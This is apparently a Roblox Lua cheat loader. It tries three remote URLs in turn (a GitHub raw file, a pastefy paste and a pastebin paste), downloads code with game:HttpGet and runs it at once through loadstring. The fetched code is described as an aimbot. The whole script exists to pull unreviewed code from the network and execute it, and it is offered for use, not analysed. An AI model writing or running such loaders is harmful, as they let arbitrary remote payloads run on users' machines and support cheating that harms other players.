local urls = {
    "https://raw.githubusercontent.com/SCRIPTHUB-dev-god/aimbot/refs/heads/main/aimbot.main",
    "https://pastefy.app/EVjDa1Fm/raw",
    "https://pastebin.com/raw/qXzQJ4CH"
}

for _, url in ipairs(urls) do
    local ok = pcall(function()
        local code = game:HttpGet(url)
        loadstring(code)()
    end)
    if ok then
        break
    end
end
